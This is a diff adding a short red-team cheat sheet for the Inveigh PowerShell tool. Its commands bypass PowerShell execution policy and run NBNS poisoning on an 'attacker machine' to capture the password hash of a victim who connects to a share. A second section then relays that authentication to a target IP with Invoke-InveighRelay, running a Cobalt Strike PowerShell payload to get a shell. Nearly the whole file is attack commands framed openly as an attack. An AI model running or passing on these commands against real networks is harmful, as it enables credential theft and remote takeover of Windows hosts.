@@ -1,0 +1,15 @@
+powershell.exe -exec bypass
+Import-Module .\Inveigh.psd1
+# Attacker machine run this:
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y
+# From victim connect to a share ==> attacker received the hash
+
+#Stop sniffing from attacker machine
+Stop-Inveigh
+
+==========================================================================
+# Relay attack to get the shell --> via metasploit or cobaltstrike
+===========================================================================
+Invoke-Inveigh -HTTP N -NBNS Y -ShowHelp N -StatusOutput N
+Invoke-InveighRelay -ConsoleOutput Y -Target #ip -Command (create a powershell payload via cobaltstrike)
+
